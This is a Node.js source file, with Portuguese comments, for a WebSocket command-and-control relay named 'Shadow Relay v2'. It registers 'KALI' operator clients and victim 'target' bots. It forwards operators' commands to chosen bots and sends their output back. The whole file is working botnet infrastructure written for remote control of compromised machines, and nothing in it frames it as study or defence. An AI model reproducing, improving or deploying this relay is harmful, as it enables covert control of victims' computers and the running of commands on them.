const WebSocket = require('ws');
const http = require('http');

const PORT = process.env.PORT || 10000;
const server = http.createServer((_, r) => r.end('Shadow Relay v2 Online'));
const wss = new WebSocket.Server({ server });

const OPERADORES = new Set(); // Usando Set para guardar os sockets reais
const BOT = new Map();

function logger(msg) {
    const agora = new Date().toLocaleString('pt-BR');
    console.log(`[${agora}] ${msg}`);
}

wss.on('connection', (ws, req) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const p = new URLSearchParams(req.url.split('?')[1]);
    const who = p.get('id');

    if (!who) return ws.close(1002);

    if (who === 'KALI') {
        OPERADORES.add(ws); // Guarda o objeto do socket
        logger(`[+] OPERADOR CONECTADO: Kali de ${ip}`);
        
        // Avisa sobre bots existentes
        BOT.forEach((_, id) => {
            ws.send(JSON.stringify({ t: 'bot', s: 'on', id }));
        });
    } else {
        BOT.set(who, ws);
        logger(`[*] ALVO CONECTADO: ${who} [IP: ${ip}]`);
        
        // Notifica todos os operadores Kali ativos
        const msg = JSON.stringify({ t: 'bot', s: 'on', id: who });
        OPERADORES.forEach(op => {
            if (op.readyState === WebSocket.OPEN) op.send(msg);
        });
    }

    ws.on('message', (data) => {
        try {
            const j = JSON.parse(data);
            if (OPERADORES.has(ws)) {
                const b = BOT.get(j.to);
                if (b && b.readyState === WebSocket.OPEN) b.send(j.cmd);
            } else {
                const msg = JSON.stringify({ t: 'res', f: who, d: j.out });
                OPERADORES.forEach(op => {
                    if (op.readyState === WebSocket.OPEN) op.send(msg);
                });
            }
        } catch (e) { }
    });

    ws.on('close', () => {
        if (OPERADORES.has(ws)) {
            OPERADORES.delete(ws);
            logger(`[-] OPERADOR DESCONECTADO`);
        } else {
            BOT.delete(who);
            logger(`[!] ALVO OFFLINE: ${who}`);
            const msg = JSON.stringify({ t: 'bot', s: 'off', id: who });
            OPERADORES.forEach(op => {
                if (op.readyState === WebSocket.OPEN) op.send(msg);
            });
        }
    });
});

server.listen(PORT, () => logger(`SERVIDOR ESTÁVEL NA PORTA ${PORT}`));
